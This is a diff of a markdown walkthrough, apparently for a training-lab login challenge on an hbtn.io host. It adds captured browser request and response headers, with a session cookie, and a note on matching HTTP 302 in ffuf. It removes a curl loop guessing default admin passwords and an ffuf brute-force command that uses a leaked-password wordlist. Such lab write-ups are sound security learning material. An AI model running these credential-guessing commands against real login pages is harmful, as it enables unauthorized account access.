@@ -67,8 +67,76 @@ curl -s -X POST "https://web-80-47-145.cod-eu-west-3.hbtn.io/login" \
 
 We found endpoint `/login` and wrong password returns status code 400.
 
+## Side Step: Mimicking Browser Requests
+
+> We just realized that when clicking the login button on the webpage, it diverts us to url  \
+[https://web-80-47-145.cod-eu-west-3.hbtn.io/login](https://web-80-47-145.cod-eu-west-3.hbtn.io/login)  \
+and the login sends a POST request to `/login` with `Content-Type: application/x-www-form-urlencoded` and not `application/json`. This is a common mistake when testing APIs, we should always try to mimic the real requests as closely as possible.
+
+### Traces from Mozilla Firefox Developer Tools
+
+```html
+POST
+	https://web-80-47-145.cod-eu-west-3.hbtn.io/login
+scheme
+	https
+host
+	web-80-47-145.cod-eu-west-3.hbtn.io
+filename
+	/login
+```
+
+```http
+Status
+302
+FOUND
+VersionHTTP/1.1
+Transferred5.50 kB (0 B size)
+Referrer Policystrict-origin-when-cross-origin
+Request PriorityHighest
+DNS ResolutionSystem
+```
+
+#### Request Headers
+
+```http
+POST /login HTTP/1.1
+Host: web-80-47-145.cod-eu-west-3.hbtn.io
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br, zstd
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 32
+Origin: https://web-80-47-145.cod-eu-west-3.hbtn.io
+Connection: keep-alive
+Referer: https://web-80-47-145.cod-eu-west-3.hbtn.io/login
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+```
+
+#### Response Headers
+
+```http
+HTTP/1.1 302 FOUND
+Server: nginx/1.18.0 (Ubuntu)
+Date: Mon, 01 Jun 2026 10:42:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 207
+Connection: keep-alive
+Location: /dashboard
+Vary: Cookie
+Set-Cookie: session=.eJyFjcEKgkAURX_l9dYSzagTzE7MNhUFuQuRp_PGBDVwciX-e1MtWra693IPnBlL25G7s0N9mxGePtBNdc3OYYB5cj2AhPR8uhyzPNutIDF9OwB9AGioHdisYd9Ro0GEKtyQIcERm1hWMStVWRlZJayhrcViKQL0uqaUqPEvHuD46NiT9Hb6OTkey9agFt8-UP-7lxeZ5D36.ah1iMA.T_Y8tX-A-ECoMf1iajJF7ADliPU; Path=/
+```
+
+
 ## Fuzzing inspired by browser login, status code 302 ok
 
+From browser login, we see that a successful login returns status code 302 and not 400. Let's use that in our `ffuf` command (-mc 302) to find the correct password.
 
 ```bash
 ffuf \
@@ -169,41 +237,3 @@ cat 1-flag.txt
 
 ```
 
-
-
-## Step 2: Trying Default Credentials first
-
-Trying the usual suspects manually.
-
-```bash
-# -o /dev/null - silence the body entirely
-# -w "[%{http_code}]" - display only the status code 
-for p in admin password admin123 123456 root toor letmein changeme; do
-  echo -n "== admin:$p ==>\t"
-  curl -s -o /dev/null -X POST "https://web-80-47-145.cod-eu-west-3.hbtn.io/login" \
-    -H "Content-Type: application/json" \
-    -d "{\"username\":\"admin\",\"password\":\"$p\"}" -w "[%{http_code}]"
-  echo
-done
-
-# == admin:admin ==>      [400]
-# == admin:password ==>   [400]
-# == admin:admin123 ==>   [400]
-# == admin:123456 ==>     [400]
-# == admin:root ==>       [400]
-# == admin:toor ==>       [400]
-# == admin:letmein ==>    [400]
-# == admin:changeme ==>   [400]
-
-```
-
-### Step 3: `ffuf` Brute-Force
-
-```bash
-ffuf -w /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-dup.txt \
-  -u "https://web-80-47-145.cod-eu-west-3.hbtn.io/api/login" \
-  -X POST \
-  -H "Content-Type: application/json" \
-  -d '{"username":"admin","password":"FUZZ"}' \
-  -fc 400
-```
